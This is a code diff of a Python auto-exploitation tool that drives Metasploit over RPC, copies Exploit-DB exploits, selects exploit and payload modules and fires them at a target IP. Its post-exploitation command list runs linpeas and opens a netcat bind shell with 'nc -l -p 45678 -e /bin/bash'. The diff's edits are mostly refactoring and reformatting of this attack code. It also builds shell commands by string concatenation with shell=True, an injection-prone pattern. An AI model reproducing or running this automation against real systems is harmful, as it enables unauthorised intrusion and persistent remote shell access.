@@ -8,7 +8,7 @@ from capstone import CS_OP_IMM
 
 from netaddr import P
 import autopayload
-from pymetasploit3.msfrpc import MsfRpcClient
+from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PayloadModule
 import time
 from logs import LOG
 import post.postexploit as postexploit
@@ -82,26 +82,27 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
         result = json.loads(f.read())
     return result
 
-def getEdbExploit(res=[]):
-    edbExploits=[]
-    for search in res:
-        edbExploits+=search["RESULTS_EXPLOIT"]
 
-    paths =[]
+def getEdbExploit(res=[]):
+    edbExploits = []
+    for search in res:
+        edbExploits += search["RESULTS_EXPLOIT"]
+
+    paths = []
     if edbExploits:
         paths = [pwn["Path"] for pwn in edbExploits]
-    
+
     if paths:
-        k=0
+        k = 0
         for path in paths:
             command = "cp " + path + " ./edb/exploit_" + str(k)
             print(command)
-            subprocess.run(command,shell=True)
-            k+=1
+            subprocess.run(command, shell=True)
+            k += 1
     pprint.pprint(paths)
 
 
-def createExploitList(res=[]) -> tuple[list[str],list[str]]:
+def createExploitList(res=[]) -> tuple[list[str], list[str]]:
     """Create exploits / metasploits lists from the list of research
     returns (titles, metaexploits)
     """
@@ -156,7 +157,7 @@ def runMetasploit(reinit=False, show=True) -> MsfRpcClient:
     return client
 
 
-def searchModules(client: MsfRpcClient = None, attack="") -> list[dict]:
+def searchModules(client: MsfRpcClient, attack: str) -> list[dict]:
     modules = client.modules.search(attack)
 
     print("[~] Available modules :")
@@ -169,6 +170,19 @@ def searchModules(client: MsfRpcClient = None, attack="") -> list[dict]:
 
 
 # TODO couper exploitVuln en 3 fonctions select exploit, select payload et exploitVuln
+def selectExploitMS(
+    client: MsfRpcClient, exploit_fullname: str
+) -> tuple[ExploitModule, list[str]]:
+    """Select the exploit to use, return it with the available payloads"""
+    exploit_ms = client.modules.use("exploit", exploit_fullname)
+    return exploit_ms, exploit_ms.targetpayloads()
+
+
+def selectPayloadMS(client: MsfRpcClient, payload_fullname: str) -> PayloadModule:
+    """Select the payload to use"""
+    return client.modules.use("payload", payload_fullname)
+
+
 def exploitVuln(client=None, modlist=[]) -> None:
     """Execute selected payload on the targeted"""
     exploit = client.modules.use(modlist[0]["type"], modlist[0]["fullname"])
@@ -322,7 +336,7 @@ sequence = [
     "echo 0xcafedeadbeef",
     "chmod +x linpeas.sh",
     "echo matthislemechan",
-    "nc -l -p 45678 -e /bin/bash"
+    "nc -l -p 45678 -e /bin/bash",
 ]
 
 sendCommands(shell, sequence)
